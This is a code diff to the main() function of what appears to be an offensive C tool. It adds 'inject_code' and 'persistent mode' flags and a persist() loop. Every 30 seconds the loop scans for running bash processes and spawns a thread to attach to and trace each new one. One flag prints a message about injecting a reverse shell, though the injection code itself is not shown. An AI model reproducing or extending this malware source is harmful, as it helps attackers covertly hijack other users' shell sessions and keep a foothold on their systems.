@@ -17,14 +17,15 @@ int main(int argc, char **argv)
 		{"pid", required_argument, 0, 'p'},
 		{"process_name", required_argument, 0, 'n'},
 		{"List_processes", no_argument, 0 , 'l'},
-		//{"inject_code", }
+		{"inject_code", no_argument, 0, 'i'},
+		{"persistent mode", no_argument, 0, 'P'},
 		{"help", no_argument, 0, 'h'}
 	};
 
 	int option;
 	int long_index = 0;
 	char *value;
-	while((option = getopt_long(argc, argv, "p:n:lh", long_options, &long_index)) != -1)
+	while((option = getopt_long(argc, argv, "p:n:lhiP", long_options, &long_index)) != -1)
 	{
 		switch(option)
 		{
@@ -39,9 +40,12 @@ int main(int argc, char **argv)
 				proc->next = NULL;
 
 				/* Create a new thread to handle messing with the process */
-				if(pthread_create(&thread_id, NULL, init_thread, proc)) 
+				if(pthread_create(&thread_id, NULL, init_thread, proc))
+				{
 					printf("[!] Error creating thread [!]\n");
-
+					return 1;
+				} 
+				proc->being_traced = true;
 				pthread_join(thread_id, NULL); //wait for the thread to finish
 				break;
 			case 'n':
@@ -52,94 +56,98 @@ int main(int argc, char **argv)
 			case 'l':
 				find_process("ALL", 0);
 				break;
+			case 'i':
+				printf("[+] Injecting reverse shell into process [+]\n");
+				break;
+			case 'P':
+				printf("[+] going persistent [+]\n");
+				persist();
+				break;
 			case 'h':
 				usage();
 				break;
 		}
 	}
 
-
-	/* using if(false) for testing purposes */
-	if(true)
-	{
-		/* Initialise hash table */
-		struct pid_hash_table *my_table = (struct pid_hash_table *)malloc(sizeof(pid_hash_table));
-		my_table->size = 100;
-
-		/* Allocate hashtable buckets */
-		my_table->table = malloc(sizeof(struct pid_struct*) * my_table->size);
-
-		pthread_t thread_id;
-
-		/* Null out the buckets */
-		for(int i = 0; i < my_table->size; i++)
-			my_table->table[i] = NULL;
-		
-		unsigned int timer = 0;
-
-		while(true)
-		{
-			if(timer == 1) //clear the hash table every 5 minutes
-			{
-				printf("CLEARING\n");
-				clear_table(my_table);
-				timer = 0;
-			}
-		
-			struct pid_struct *proc_list = find_process("ALL", my_table);
-			
-			/* proc_list == NULL when no bash processes running */
-			if(proc_list != NULL)
-				update_hash_table(proc_list, my_table);
-			
-			/* Iterate over the hashtable and decide which processes to attach to */
-			for(int i = 0; i < my_table->size; i++)
-			{
-				struct pid_struct *proc = my_table->table[i];
-
-				/* Iterate over the entries in that position of the hashtable */
-				while(proc != NULL)
-				{
-					/* We can use the proc_name field to decide what processes to attach to */
-					if(strcmp(proc->proc_name, "bash") == 0 && proc->is_alive && !proc->being_traced)
-					{
-						/* If the thread is successfully created */
-						if(pthread_create(&thread_id, NULL, init_thread, proc) == 0)
-							proc->being_traced = true; //mark this process as being traced
-					}
-						
-					proc = proc->next;
-				}
-				
-			}
-
-			//Debug (Print the state of the hash table)
-			for(int i = 0; i < my_table->size; i++)
-			{
-				if(my_table->table[i] != NULL)
-				{
-
-
-					struct pid_struct *x = my_table->table[i];
-					while(x != NULL)
-					{
-						printf("[%d:%d]%s -> ",i,x->pid, x->proc_name);
-						x = x->next;
-						if(x == NULL)
-							printf("\n");
-					}
-				}
-			}
-			
-			printf("SLEEP\n");
-			/* Sleep to save system resources */
-			sleep(30);
-			timer++;
-		}
-	}
-
 }
 
+void persist()
+{
+	/* Initialise hash table */
+	struct pid_hash_table *my_table = (struct pid_hash_table *)malloc(sizeof(pid_hash_table));
+	my_table->size = 100;
+
+	/* Allocate hashtable buckets */
+	my_table->table = malloc(sizeof(struct pid_struct*) * my_table->size);
+
+	pthread_t thread_id;
+
+	/* Null out the buckets */
+	for(int i = 0; i < my_table->size; i++)
+		my_table->table[i] = NULL;
+	
+	unsigned int timer = 0;
+
+	while(true)
+	{
+		if(timer == 10) //clear the hash table every 5 minutes
+		{
+			printf("CLEARING\n");
+			clear_table(my_table);
+			timer = 0;
+		}
+		
+		struct pid_struct *proc_list = find_process("ALL", my_table);
+			
+		/* proc_list == NULL when no bash processes running */
+		if(proc_list != NULL)
+			update_hash_table(proc_list, my_table);
+			
+		/* Iterate over the hashtable and decide which processes to attach to */
+		for(int i = 0; i < my_table->size; i++)
+		{
+			struct pid_struct *proc = my_table->table[i];
+
+			/* Iterate over the entries in that position of the hashtable */
+			while(proc != NULL)
+			{
+				/* We can use the proc_name field to decide what processes to attach to */
+				if(strcmp(proc->proc_name, "bash") == 0 && proc->is_alive && !proc->being_traced)
+				{
+					/* If the thread is successfully created */
+					if(pthread_create(&thread_id, NULL, init_thread, proc) == 0)
+						proc->being_traced = true; //mark this process as being traced
+				}
+						
+				proc = proc->next;
+			}
+				
+		}
+
+		//Debug (Print the state of the hash table)
+		for(int i = 0; i < my_table->size; i++)
+		{
+			if(my_table->table[i] != NULL)
+			{
+
+
+				struct pid_struct *x = my_table->table[i];
+				while(x != NULL)
+				{
+					printf("[%d:%d]%s -> ",i,x->pid, x->proc_name);
+					x = x->next;
+					if(x == NULL)
+						printf("\n");
+				}
+			}
+		}
+			
+		printf("SLEEP\n");
+		/* Sleep to save system resources */
+		sleep(30);
+		timer++;
+	}
+}
 	
 void *init_thread(void *args)
 {
